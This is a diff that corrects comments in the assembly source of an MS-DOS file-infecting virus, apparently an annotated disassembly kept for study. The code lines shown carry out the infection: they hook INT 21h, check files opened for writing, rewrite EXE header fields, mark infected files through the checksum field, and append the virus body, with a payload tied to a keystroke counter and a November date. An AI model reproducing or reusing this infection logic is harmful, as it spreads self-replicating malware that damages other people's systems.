@@ -24,8 +24,8 @@ host:
 k_are_you_there:              equ 'VX'
 k_exe_magic_number:           equ 'MZ'
 k_infection_marker:           equ 'MZ'
-k_payload_activation_counter: equ 500             ; decremented after each INT 9 call; on 0, the payload is
-                                                  ; activated
+k_payload_activation_counter: equ 500             ; checked before decrement on each INT 9 call;
+                                                  ; starting at 500, activation occurs on call 501
 k_resident_memory_paragraphs: equ (virus_end_in_memory-virus_begin)/16+1
 k_exe_header_size:            equ r_payload_activation_counter-v_exe_header
 
@@ -163,7 +163,7 @@ int_21_handler:
 
       CMP  AH, 3Dh                               ; open file?
       JNZ  not_open_file
-      TEST AL, 1                                 ; open file for writing?
+      TEST AL, 1                                 ; bit 0 distinguishes write-only (1) from read-only (0) and read/write (2)
       JZ   infect_if_not_virus_call
 not_open_file:
       CMP  AH, 43h                               ; get/set file attributes?
@@ -187,7 +187,7 @@ infect_if_not_virus_call:
 
 infection_preparations:
 
-      PUSH AX                                     ; save all flags
+      PUSH AX                                     ; save registers; FLAGS are not saved by these pushes
       PUSH BX
       PUSH CX
       PUSH DX
@@ -279,7 +279,7 @@ file_attributes_reset_ok:
       JNB  file_opened_ok
       JMP  close_file
 file_opened_ok:
-      XCHG BX, AX                                 ; AX=file handle; BX is for the save timestamp,
+      XCHG BX, AX                                 ; BX now holds the file handle used by the timestamp calls;
       MOV  BP, BX                                 ; BP is saved, in case it's needed later.
       PUSH CS
       POP  DS
@@ -312,7 +312,7 @@ copy_header:
 
       MOV  CL, k_exe_header_size-2                ; prepare parameters for EXE file
       MOV  DX, v_exe_header+2-vars_base
-      MOV  DI, v_exe_header+12h-vars_base         ; DI=infection marker location; EXE 12h=usable space in exe header
+      MOV  DI, v_exe_header+12h-vars_base         ; DI=infection marker location; EXE offset 12h is the checksum field
 
 read_heading_bytes:
 
@@ -340,7 +340,7 @@ com_file_checks:
 
       OR   DX, DX                                 ; DX:AX=size -> don't infect if > 64K
       JNZ  exit_without_infection_2
-      CMP  AX, 0EA60h                             ; don't infect if size > 60K
+      CMP  AX, 0EA60h                             ; don't infect if size > 60000 bytes (not 60 KiB)
       JA   exit_without_infection_2
 
       ADD  AX, 100h
@@ -402,7 +402,7 @@ declared_program_length_ok:
       MOV  [DI+12h], DX                           ; header@14h: Value of IP
       ADD  DX, 497h
       MOV  [DI+0Eh], DX                           ; header@10h: Value of SP
-      MOV  [DI+0Ch], AX                           ; header@0Eh: Segment correction for CS
+      MOV  [DI+0Ch], AX                           ; header@0Eh: Initial SS relative to the load module
       POP  DX                                     ; file length (see above)
       POP  AX                                     ; ^^
       ADD  AX, virus_end_in_file-virus_begin      ; add file size, then prepare values for
@@ -415,7 +415,7 @@ declared_program_length_ok:
 last_page_empty_2:
       MOV  [DI+2], AX                             ; header@04h: Length of program in 512 byte pages
       MOV  [DI], DX                               ; header@02h: Length of last non-full page.
-      MOV  WORD [DI+10h], k_infection_marker      ; header@12h: usable space in exe header; used for infection marker
+      MOV  WORD [DI+10h], k_infection_marker      ; header@12h: checksum field, repurposed as an infection marker
 
 append_virus:
 
@@ -531,7 +531,7 @@ dont_activate_payload_yet:
 v_flags:                    db 21h
 k_flag_infection_initiated: equ 1
 k_flag_exe_infection:       equ 2
-k_flag_activate_payload:    equ 4                 ; if true, payload is activated (and executed on Nov 17h).
+k_flag_activate_payload:    equ 4                 ; if true, the date gate permits the payload on November 17 or later in November.
                                                   ; it is set after a certain number of INT 9 calls are made.
 
 v_curr_segment:             dw 1862h
